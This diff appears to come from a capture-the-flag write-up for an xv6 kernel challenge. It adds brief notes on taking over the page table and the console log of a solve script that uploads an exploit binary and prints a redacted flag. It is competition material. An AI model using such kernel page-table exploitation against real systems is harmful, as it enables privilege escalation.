@@ -35,3 +35,24 @@ Problem with trampoline its only mapped X by kernel.
 Problem with trapframe is there is a different one for each user thread. And its not mapped by kernel at all.
 Owning the pagetable is surely the easiest way to go.
 
+$ python3 solve.py
+[+] Opening connection to xv6homework.challs.open.ecsc2024.it on port 38016: Done
+hashcash -mCb26 "bKDfEU15qpnq"
+1:26:241003:bKDfEU15qpnq::EvLcZe2CP+/n9f0v:0000DI40z
+Result: Give me the base64-encoded ELF of your program.
+Input "EOF" on an empty line when done.
+nmeta 46 (boot, super, log blocks 30 inode blocks 13, bitmap blocks 1) blocks 1954 total 2000
+balloc: first 468 blocks have been allocated
+balloc: write bitmap block at sector 45
+
+xv6 kernel is booting
+
+hart 1 starting
+init: starting sh
+$ exe
+found page va 0x000000000002E000
+2
+3
+4
+openECSC{redacted}
+
